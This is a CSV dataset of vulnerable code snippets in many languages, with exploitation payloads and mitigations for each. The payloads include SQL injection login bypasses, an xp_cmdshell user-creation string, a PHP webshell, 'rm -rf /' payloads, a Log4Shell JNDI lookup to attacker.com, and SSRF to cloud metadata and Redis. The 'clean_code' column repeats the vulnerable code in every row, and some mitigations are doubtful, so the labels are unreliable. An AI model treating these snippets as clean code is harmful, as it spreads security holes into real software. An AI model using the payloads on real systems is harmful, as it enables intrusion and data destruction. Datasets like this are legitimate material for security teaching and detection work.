id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-011,Go,SQL Injection,Formatted strings in database queries expose to attacks.,"query := fmt.Sprintf(""SELECT * FROM users WHERE username = '%s' AND password = '%s'"", r.FormValue(""username""), r.FormValue(""password"")); db.Query(query)",Payload: ' OR '1'='1 to login bypass. Use go-sql-driver exploits.,"Prepared statements: stmt, _ := db.Prepare(""SELECT * FROM users WHERE username = ? AND password = ?""); stmt.Query(username, password)","query := fmt.Sprintf(""SELECT * FROM users WHERE username = '%s' AND password = '%s'"", r.FormValue(""username""), r.FormValue(""password"")); db.Query(query)",True,True,False,False,152,False,True,True,Injection,1
vuln-012,Go,Path Traversal,User input in file paths allows accessing unauthorized files.,"http.HandleFunc(""/file"", func(w http.ResponseWriter, r *http.Request) { file := r.URL.Query().Get(""file""); data, _ := ioutil.ReadFile(file); ... })",Query ?file=../../../etc/passwd to read sensitive files.,"Canonicalize paths: filepath.Clean(file). Restrict to base dir with filepath.Join(base, file).","http.HandleFunc(""/file"", func(w http.ResponseWriter, r *http.Request) { file := r.URL.Query().Get(""file""); data, _ := ioutil.ReadFile(file); ... })",True,True,True,False,147,False,True,False,File_Handling,1
vuln-013,C# (.NET),SQL Injection,Concatenated SQL commands from input.,"string query = ""SELECT * FROM users WHERE username = '"" + Request.Form[""username""] + ""' AND password = '"" + Request.Form[""password""] + ""'""; SqlCommand cmd = new SqlCommand(query);",Input: '; EXEC xp_cmdshell('net user hacker pass /add')-- for command exec.,"Parameterized: SqlCommand cmd = new SqlCommand(""SELECT * FROM users WHERE username = @user AND password = @pass""); cmd.Parameters.AddWithValue(""@user"", username);","string query = ""SELECT * FROM users WHERE username = '"" + Request.Form[""username""] + ""' AND password = '"" + Request.Form[""password""] + ""'""; SqlCommand cmd = new SqlCommand(query);",True,True,False,False,179,False,True,True,Injection,1
vuln-014,C# (.NET),LDAP Injection,Unsanitized input in LDAP queries.,"string filter = ""(uid="" + username + "")""; DirectorySearcher searcher = new DirectorySearcher(filter);",Input: *)(uid=*))(|(uid=* to bypass filters and enumerate users.,"Escape special chars: username = username.Replace(""("", ""%28"").Replace("")"", ""%29""); Use parameterized LDAP if available.","string filter = ""(uid="" + username + "")""; DirectorySearcher searcher = new DirectorySearcher(filter);",False,False,False,False,101,True,True,True,Injection,1
vuln-015,Node.js,NoSQL Injection,Unsanitized input in MongoDB queries allows query manipulation.,"const query = { username: req.body.username, password: req.body.password }; db.collection('users').findOne(query);","Input JSON like {""$ne"": null} for username to bypass checks. Use NoSQLMap for automation.",Use MongoDB's aggregation or sanitize with mongoose schemas. Validate inputs strictly.,"const query = { username: req.body.username, password: req.body.password }; db.collection('users').findOne(query);",True,True,False,False,114,False,True,False,Injection,1
vuln-016,Node.js,SSRF,User-controlled URLs in requests lead to internal resource access.,const url = req.query.url; axios.get(url).then(res => {...});,Request internal IPs like http://169.254.169.254/latest/meta-data/ for cloud metadata. Chain with DNS rebinding.,Whitelist allowed domains. Use libraries like ssrf-req-filter.,const url = req.query.url; axios.get(url).then(res => {...});,True,True,False,False,61,False,False,False,Other,1
vuln-017,Python,Deserialization,Untrusted data in pickle loads arbitrary code execution.,import pickle; data = request.data; obj = pickle.loads(data);,Craft malicious pickle with __reduce__ to exec os.system('rm -rf /'). Use ysoserial equivalents.,Avoid pickle; use JSON or safe serializers like msgpack. Sign data with HMAC.,import pickle; data = request.data; obj = pickle.loads(data);,False,False,False,False,61,False,False,False,Other,1
vuln-018,Python,Path Traversal,User input in file paths exposes sensitive files.,"filename = request.args.get('file'); with open(filename, 'r') as f: ...",Input ../etc/passwd to read files. Traverse to /proc/self/environ for env vars.,Use os.path.normpath and check against base dir. Whitelist file names.,"filename = request.args.get('file'); with open(filename, 'r') as f: ...",False,False,True,False,71,False,True,False,File_Handling,1
vuln-019,Java,Deserialization,ObjectInputStream on untrusted data executes gadgets.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();,Use ysoserial CommonsCollections for RCE. Chain gadgets for command exec.,Use SerialKiller or NotSoSerial lookback. Avoid deserialization of untrusted data.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();,True,False,False,False,109,False,False,False,Other,1
vuln-020,Java,LDAP Injection,Unsanitized input alters LDAP filters.,"String filter = ""(cn="" + userInput + "")""; ldapCtx.search("""", filter, controls);",Input *)(|(objectClass=*) to enumerate. Bypass auth with )(uid=*.,"Escape LDAP chars: replace * with \2a, ( with \28. Use prepared LDAP statements if available.","String filter = ""(cn="" + userInput + "")""; ldapCtx.search("""", filter, controls);",True,False,False,False,79,True,True,True,Injection,1
vuln-021,PHP,XXE,XML processing without disabling entities.,$xml = simplexml_load_string($input);,Inject <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> &xxe; for file read.,libxml_disable_entity_loader(true); Use DOMDocument with setFeature.,$xml = simplexml_load_string($input);,True,False,False,False,37,False,False,False,Other,1
vuln-022,PHP,Unrestricted File Upload,No validation on uploaded files allows webshells.,"move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",Upload .php with <?php system($_GET['cmd']); ?> and access for RCE.,"Check MIME types, extensions. Store outside webroot, generate random names.","move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);",False,False,False,False,86,False,True,False,File_Handling,1
vuln-023,Ruby,Deserialization,Marshal.load on untrusted data executes code.,obj = Marshal.load(input);,Craft payload with _dump to exec system calls. Use Ruby equivalents of ysoserial.,Use JSON or YAML.safe_load. Sign data with secrets.,obj = Marshal.load(input);,True,False,False,False,26,False,False,False,Other,1
vuln-024,Ruby,SSRF,OpenURI with user URLs accesses internals.,require 'open-uri'; URI.open(params[:url]).read;,file:///etc/passwd or http://127.0.0.1/admin for local access.,Use Net::HTTP with domain whitelisting. Avoid file:// scheme.,require 'open-uri'; URI.open(params[:url]).read;,True,False,True,False,48,False,True,False,Other,1
vuln-025,Go,Deserialization,"Gob decoding untrusted data, though less common, can lead to issues.",dec := gob.NewDecoder(bytes.NewReader(data)); var obj MyType; dec.Decode(&obj);,Exploit type mismatches or large allocations for DoS. Limited RCE.,Use JSON or protobuf. Validate and limit input size.,dec := gob.NewDecoder(bytes.NewReader(data)); var obj MyType; dec.Decode(&obj);,False,False,False,False,79,False,False,False,Other,1
vuln-026,Go,SSRF,http.Get with user input URLs.,"resp, _ := http.Get(r.URL.Query().Get(""url""));",http://localhost:8080/secret or gopher:// for protocol abuse.,Custom transport with URL parsing and domain whitelist.,"resp, _ := http.Get(r.URL.Query().Get(""url""));",True,True,False,False,46,False,True,False,Other,1
vuln-027,C# (.NET),Deserialization,BinaryFormatter on untrusted data executes gadgets.,BinaryFormatter bf = new BinaryFormatter(); object obj = bf.Deserialize(stream);,Ysoserial.Net payloads like TextFormattingRunProperties for RCE.,Avoid BinaryFormatter; use Json.NET with TypeNameHandling.None.,BinaryFormatter bf = new BinaryFormatter(); object obj = bf.Deserialize(stream);,False,False,False,False,80,False,False,False,Other,1
vuln-028,C# (.NET),XXE,XmlReader without secure settings.,XmlReader reader = XmlReader.Create(new StringReader(xml));,XXE payload for file:/C:/Windows/win.ini read.,XmlReaderSettings settings = new XmlReaderSettings() { DtdProcessing = DtdProcessing.Prohibit };,XmlReader reader = XmlReader.Create(new StringReader(xml));,False,False,False,False,59,False,False,False,Other,1
vuln-029,Node.js,Prototype Pollution,Merging untrusted objects pollutes prototypes.,"function merge(target, source) { for (let key in source) { target[key] = source[key]; } } merge({}, req.body);","Input {""__proto__"": {""admin"": true}} to alter behavior.",Use Object.create(null) or libraries like lodash merge with checks.,"function merge(target, source) { for (let key in source) { target[key] = source[key]; } } merge({}, req.body);",True,False,False,False,110,False,False,False,Other,1
vuln-030,Node.js,JWT None Algorithm,Accepting 'none' algorithm in JWT validation.,"jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });",Change alg to none and remove signature for bypass.,Specify algorithms: ['HS256']. Use jsonwebtoken with strict options.,"jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });",False,False,False,False,61,False,True,False,Other,1
vuln-031,Python,SSRF,requests.get with user URLs.,import requests; requests.get(request.args.get('url')),dict://localhost:6379/info for port scanning.,Use defuse/ssrf-filters or whitelist URLs.,import requests; requests.get(request.args.get('url')),False,False,False,False,54,False,True,False,Other,1
vuln-032,Python,Template Injection,Jinja2 with user input in templates.,from jinja2 import Template; Template(user_input).render();,{{ config.items() }} for config dump. Escalate to RCE with __globals__.,Sandbox environment or avoid rendering user templates.,from jinja2 import Template; Template(user_input).render();,True,False,False,False,59,False,False,False,Injection,1
vuln-033,Java,SSRF,URL connections with user input.,"URL url = new URL(request.getParameter(""url"")); url.openConnection();",jar:file:///etc/passwd!/ for file read.,Validate scheme and host. Use Apache HttpClient with restrictions.,"URL url = new URL(request.getParameter(""url"")); url.openConnection();",True,False,True,False,69,False,True,False,Other,1
vuln-034,Java,Log4Shell,Log4j vulnerable to JNDI injection.,logger.error(userInput); // with log4j < 2.15,${jndi:ldap://attacker.com/a} for RCE.,Upgrade to log4j 2.17+. Set log4j2.formatMsgNoLookups=true.,logger.error(userInput);,True,False,False,False,45,False,False,False,Other,1
vuln-035,PHP,Deserialization,unserialize on user data.,unserialize($_COOKIE['data']);,PHPGGC payloads for __destruct RCE.,"Use json_decode. If needed, allowed_classes option.",unserialize($_COOKIE['data']);,False,False,False,False,30,False,True,False,Other,1
vuln-036,PHP,SSRF,curl_exec with user URLs.,$ch = curl_init($_GET['url']); curl_exec($ch);,gopher://127.0.0.1:6379/_%0d%0aSET%20key%20val for Redis attack.,"curl_setopt(CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);",$ch = curl_init($_GET['url']); curl_exec($ch);,False,True,False,True,46,False,True,False,Other,1
vuln-037,Ruby,YAML Deserialization,YAML.load on untrusted input.,YAML.load(input);,"!ruby/object:Gem::Installer { :i: !ruby/object:Gem::SpecFetcher { :f: !ruby/object:Gem::Installer { :i: !ruby/object:Gem::Requirement { requirements: !ruby/object:Gem::Package::TarReader { io: !ruby/object:Net::BufferedIO { io: !ruby/object:Gem::Package::TarReader::Entry { read: 0, header: ""foo"" } } } } } } for RCE.",YAML.safe_load with permitted_classes.,YAML.load(input);,True,False,False,False,17,False,False,False,Other,1
vuln-038,Ruby,Path Traversal,File.open with user paths.,File.open(params[:file]).read,../../etc/passwd,"File.expand_path(file, base_dir) and check prefix.",File.open(params[:file]).read,True,False,True,False,29,False,False,False,File_Handling,1
vuln-039,Go,Template Injection,html/template with user input as template.,"t, _ := template.New("""").Parse(userInput); t.Execute(w, data);",{{ .OS }} or range to access env.,Don't parse user input as templates. Use static templates.,"t, _ := template.New("""").Parse(userInput); t.Execute(w, data);",True,True,False,True,62,False,True,False,Injection,1
vuln-040,Go,Insecure Randomness,math/rand for crypto purposes.,"import ""math/rand""; token := rand.Intn(1000000);",Predict seeds based on time for token guessing.,Use crypto/rand.Reader.,"import ""math/rand""; token := rand.Intn(1000000);",False,False,False,False,48,False,True,False,Other,1
vuln-041,C# (.NET),SSRF,WebClient.DownloadString with user URLs.,"new WebClient().DownloadString(Request.QueryString[""url""]);",file:///C:/inetpub/wwwroot/web.config,"Uri uri = new Uri(url); if (uri.Scheme != ""http"" && uri.Scheme != ""https"") throw;","new WebClient().DownloadString(Request.QueryString[""url""]);",True,True,False,False,59,False,True,False,Other,1
vuln-042,C# (.NET),Insecure Deserialization (JSON),JavaScriptSerializer with TypeResolver.,new JavaScriptSerializer(new SimpleTypeResolver()).Deserialize<object>(input);,Payloads for ProcessStartInfo RCE.,Use Json.NET with TypeNameHandling.None.,new JavaScriptSerializer(new SimpleTypeResolver()).Deserialize<object>(input);,True,False,False,False,78,False,False,False,Other,1
vuln-043,Kotlin,SQL Injection,String interpolation in queries.,"val query = ""SELECT * FROM users WHERE name = '${request.params[""name""]}'""; db.rawQuery(query)",' OR 1=1--,Use PreparedStatement.,"val query = ""SELECT * FROM users WHERE name = '${request.params[""name""]}'""; db.rawQuery(query)",True,True,False,False,94,False,True,True,Injection,1
vuln-044,Kotlin,Deserialization,ObjectInputStream in Kotlin.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),Similar to Java ysoserial.,"Avoid, use Kotlinx.serialization.",val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),True,False,False,False,83,False,False,False,Other,1
vuln-045,Scala,Command Injection,Process execution with input.,"import sys.process._; s""ping $host"".!",; rm -rf /,"Seq(""ping"", host).!","import sys.process._; s""ping $host"".!",False,False,False,False,37,False,True,False,Injection,1
vuln-046,Scala,XXE,XML parsing without security.,XML.loadString(xml),Standard XXE payloads.,Use SAXParser with features disabled.,XML.loadString(xml),False,False,False,False,19,False,False,False,Other,1
vuln-047,Rust,Command Injection,Command::new with unsanitized input.,"use std::process::Command; Command::new(""sh"").arg(""-c"").arg(&input).output();",ls; rm -rf /,Avoid shell; use separate args.,"use std::process::Command; Command::new(""sh"").arg(""-c"").arg(&input).output();",True,False,False,False,77,False,True,False,Injection,1
vuln-048,Rust,Path Traversal,Path::new with user input.,let path = Path::new(&input); fs::read_to_string(path);,../../../etc/passwd,Canonicalize and check components.,let path = Path::new(&input); fs::read_to_string(path);,True,False,False,False,55,False,False,False,File_Handling,1
vuln-049,Elixir,SQL Injection,Raw SQL with interpolation.,"Repo.query(""SELECT * FROM users WHERE name = '#{name}'"")",' OR 1=1,Use Ecto.Query with params.,"Repo.query(""SELECT * FROM users WHERE name = '#{name}'"")",True,True,False,False,56,False,True,False,Injection,1
vuln-050,Elixir,Command Injection,System.cmd with input.,"System.cmd(""ping"", [host])",If shell: ping; rm,Use Porcelain without shell.,"System.cmd(""ping"", [host])",False,False,False,True,26,False,True,False,Injection,1
vuln-051,Perl,SQL Injection,DBI with concatenated queries.,"$dbh->do(""SELECT * FROM users WHERE name = '$name'"");",' OR 1=1--,"Use placeholders: $dbh->prepare(""SELECT * FROM users WHERE name = ?"");","$dbh->do(""SELECT * FROM users WHERE name = '$name'"");",False,True,False,False,53,False,True,False,Injection,1
vuln-052,Perl,Command Injection,system with input.,"system(""ping $host"");",; rm -rf /,"system('ping', $host);","system(""ping $host"");",False,False,False,True,21,False,True,False,Injection,1
vuln-053,Node.js,Insecure Regex DoS,Evil regex leading to ReDoS.,/^([a-zA-Z0-9]+)*$/.test(input);,Input aaaaaaaaaaaaaaaaaaaaaaaaa! for backtracking.,Use safe-regex or atomic groups.,/^([a-zA-Z0-9]+)*$/.test(input);,True,False,False,False,32,False,False,True,Other,1
vuln-054,Python,Insecure Eval,eval on user input.,eval(request.args.get('expr')),__import__('os').system('rm -rf /'),Avoid eval; use ast.literal_eval for safe cases.,eval(request.args.get('expr')),False,False,False,True,30,False,True,False,Other,1
vuln-055,Java,Insecure Random,java.util.Random for crypto.,Random rand = new Random(); int token = rand.nextInt();,Predict based on seed.,SecureRandom sr = new SecureRandom();,Random rand = new Random(); int token = rand.nextInt();,False,False,False,False,55,False,False,False,Other,1
vuln-056,PHP,Insecure Eval,eval on input.,eval($_GET['code']);,system('rm -rf /');,Never use eval.,eval($_GET['code']);,False,False,False,True,20,False,True,False,Other,1
vuln-057,Ruby,Insecure Eval,eval on params.,eval(params[:code]),system('rm -rf /'),Avoid eval; use safer alternatives.,eval(params[:code]),True,False,False,True,19,False,False,False,Other,1
vuln-058,Go,Race Condition,File creation without checks.,"if _, err := os.Stat(file); os.IsNotExist(err) { os.Create(file); }",TOCTOU: symlink during check and create.,Use os.OpenFile with O_EXCL | O_CREATE.,"if _, err := os.Stat(file); os.IsNotExist(err) { os.Create(file); }",False,False,False,False,67,False,False,False,Other,1
vuln-059,C# (.NET),Insecure Random,System.Random for secrets.,Random rand = new Random(); int token = rand.Next();,Predictable sequences.,RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();,Random rand = new Random(); int token = rand.Next();,False,False,False,False,52,False,False,False,Other,1
vuln-060,Node.js,CORS Misconfiguration,Allowing all origins.,app.use(cors({ origin: '*' }));,CSRF from malicious sites.,Specify origins: { origin: 'trusted.com' },app.use(cors({ origin: '*' }));,False,False,False,False,31,False,True,False,Configuration,1
vuln-061,Python,CORS Misconfig,Flask-CORS with *.,"CORS(app, resources={r""/*"": {""origins"": ""*""}})",Cross-origin requests.,Specify origins.,"CORS(app, resources={r""/*"": {""origins"": ""*""}})",False,False,False,False,46,False,True,False,Configuration,1
vuln-062,Java,IDOR,Direct object reference without authz.,"User user = em.find(User.class, request.getParameter(""id""));",Change id to access others' data.,Check ownership: if (user.getId() != sessionUserId) deny;,"User user = em.find(User.class, request.getParameter(""id""));",True,False,False,False,60,False,True,False,Other,1
vuln-063,PHP,IDOR,Fetching by user-supplied ID.,"$id = $_GET['id']; $user = $db->query(""SELECT * FROM users WHERE id = $id"");",Increment IDs to leak.,Verify session user owns the ID.,"$id = $_GET['id']; $user = $db->query(""SELECT * FROM users WHERE id = $id"");",True,True,False,False,76,False,True,False,Other,1
vuln-064,Ruby,Mass Assignment,params.permit without whitelist.,User.create(params[:user]),Add admin: true in params.,"User.create(params.require(:user).permit(:name, :email))",User.create(params[:user]),True,False,False,False,26,False,False,False,Other,1
vuln-065,Go,IDOR,Direct access by ID.,"id := r.URL.Query().Get(""id""); db.GetUser(id);",Guess IDs.,Check against session user.,"id := r.URL.Query().Get(""id""); db.GetUser(id);",True,True,False,False,46,False,True,False,Other,1
vuln-066,C# (.NET),IDOR,Entity by ID without check.,"var user = db.Users.Find(Request.Query[""id""]);",Modify ID.,if (user.Id != User.Identity.GetUserId()) deny;,"var user = db.Users.Find(Request.Query[""id""]);",True,True,False,False,46,False,True,False,Other,1
vuln-067,Kotlin,SSRF,OkHttp with user URL.,val client = OkHttpClient(); client.newCall(Request.Builder().url(url).build()).execute();,Internal URLs.,Validate URL host.,val client = OkHttpClient(); client.newCall(Request.Builder().url(url).build()).execute();,False,True,False,True,90,False,False,False,Other,1
vuln-068,Scala,Deserialization,Java deserialization in Scala.,Similar to Java ObjectInputStream.,Ysoserial.,Avoid; use Scala pickling with care.,Similar to Java ObjectInputStream.,True,False,False,False,34,False,False,False,Other,1
vuln-069,Rust,SQL Injection,rusqlite with concat.,"conn.execute(&format!(""SELECT * FROM users WHERE name = '{name}'""), []);",' OR 1=1,"Use params: conn.execute(""SELECT * FROM users WHERE name = ?1"", [name]);","conn.execute(&format!(""SELECT * FROM users WHERE name = '{name}'""), []);",False,True,False,True,72,False,True,False,Injection,1
vuln-070,Elixir,Deserialization,Erlang term_to_binary inverse.,:erlang.binary_to_term(input),Craft terms for code exec.,Use :safe option or avoid.,:erlang.binary_to_term(input),True,False,False,False,29,False,False,False,Other,1
vuln-071,Perl,XXE,XML::Simple without NoExpand.,XMLin($xml);,XXE payload.,"XMLin($xml, NoExpand => 1, NSExpand => 1);",XMLin($xml);,False,False,False,False,12,False,False,False,Other,1
vuln-072,Node.js,Zip Slip,Extracting zip without path checks.,adm-zip extracts to paths with ../,Zip with ../files to overwrite.,"Sanitize paths, strip ../",adm-zip extracts to paths with ../,False,False,False,False,34,False,False,False,Other,1
vuln-073,Python,Zip Slip,zipfile.extractall without validation.,with zipfile.ZipFile(file) as z: z.extractall();,Malicious zip with ../,Check member.filename for ../,with zipfile.ZipFile(file) as z: z.extractall();,False,False,False,False,48,False,False,False,Other,1
vuln-074,Java,Zip Slip,ZipInputStream without path sanitization.,Extract to entry.getName(),../ in entry name.,Canonicalize and check path.,Extract to entry.getName(),False,False,False,False,26,False,False,False,Other,1
vuln-075,PHP,Zip Slip,ZipArchive::extractTo,$zip->extractTo('/path/');,../ in filenames.,Validate each filename.,$zip->extractTo('/path/');,False,False,False,False,26,False,True,False,Other,1
vuln-076,Ruby,Zip Slip,rubyzip extract.,Zip::File.open(file) { |z| z.each { |e| e.extract } },../ paths.,Check e.name for ../,Zip::File.open(file) { |z| z.each { |e| e.extract } },False,False,True,False,53,False,False,False,Other,1
vuln-077,Go,Zip Slip,archive/zip Reader.,"r, _ := zip.OpenReader(file); for _, f := range r.File { os.Create(f.Name) }",../ in f.Name,Clean path with filepath.Clean,"r, _ := zip.OpenReader(file); for _, f := range r.File { os.Create(f.Name) }",False,False,True,False,76,False,False,False,Other,1
vuln-078,C# (.NET),Zip Slip,ZipArchive ExtractToDirectory,"ZipFile.ExtractToDirectory(zipPath, extractPath);",../ entries.,Manual extract with path validation.,"ZipFile.ExtractToDirectory(zipPath, extractPath);",False,False,False,False,49,False,False,False,Other,1
vuln-079,Node.js,GraphQL Depth Limit,No depth limit on queries.,apollo-server without depthLimit,Nested queries for DoS.,Use graphql-depth-limit.,apollo-server without depthLimit,False,False,False,False,32,False,False,False,Other,1
vuln-080,Python,GraphQL Injection,Unsanitized inputs in resolvers.,graphql with raw SQL in resolver.,Injection in variables.,Parameterize queries in resolvers.,graphql with raw SQL in resolver.,False,False,False,False,33,False,False,False,Injection,1
vuln-081,Java,Insecure Session Handling,Session IDs exposed in URLs or predictable.,"String sessionId = UUID.randomUUID().toString(); response.sendRedirect(""page?sessionId="" + sessionId);",Sniff URLs for session IDs or brute-force predictable IDs.,"Use HttpSession with secure cookies: session.setAttribute(""user"", user); Set Secure, HttpOnly flags.","String sessionId = UUID.randomUUID().toString(); response.sendRedirect(""page?sessionId="" + sessionId);",False,False,False,False,102,False,True,True,Authentication,1
vuln-082,Java,Broken Authentication,Weak password storage without hashing.,"String password = request.getParameter(""password""); em.persist(new User(username, password));",Dump database to access plaintext passwords.,"Use BCrypt: String hashed = BCrypt.hashpw(password, BCrypt.gensalt());","String password = request.getParameter(""password""); em.persist(new User(username, password));",True,False,False,False,93,False,True,False,Authentication,1
vuln-083,PHP,Session Fixation,Not regenerating session ID on login.,session_start(); $_SESSION['user'] = $username;,"Provide malicious session ID via URL, hijack post-login.",Regenerate: session_regenerate_id(true);,session_start(); $_SESSION['user'] = $username;,False,False,False,False,47,False,True,False,Authentication,1
vuln-084,PHP,Insecure Direct Object Reference,Accessing resources by predictable IDs.,"$id = $_GET['id']; $file = file_get_contents(""files/$id.pdf"");",Guess IDs to access unauthorized files.,"Check permissions: if (!userCanAccess($id, $user)) exit;","$id = $_GET['id']; $file = file_get_contents(""files/$id.pdf"");",False,False,False,False,62,False,True,False,Other,1
